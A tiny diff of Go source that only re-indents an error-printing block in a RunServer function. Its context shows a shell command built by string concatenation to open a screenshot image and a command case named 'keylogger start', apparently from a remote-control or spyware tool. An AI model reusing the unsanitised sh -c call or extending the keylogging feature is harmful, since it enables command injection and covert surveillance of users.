@@ -367,8 +367,8 @@ func RunServer() {
 
 			out, err := exec.Command("sh", "-c", "eog " + string(outputName) + ".png").Output()
 			if err != nil {
-		     fmt.Printf("%s", err)
-		   }
+		     	 fmt.Printf("%s", err)
+		   	}
 			fmt.Printf("%s", out)
 
 		case "keylogger start":
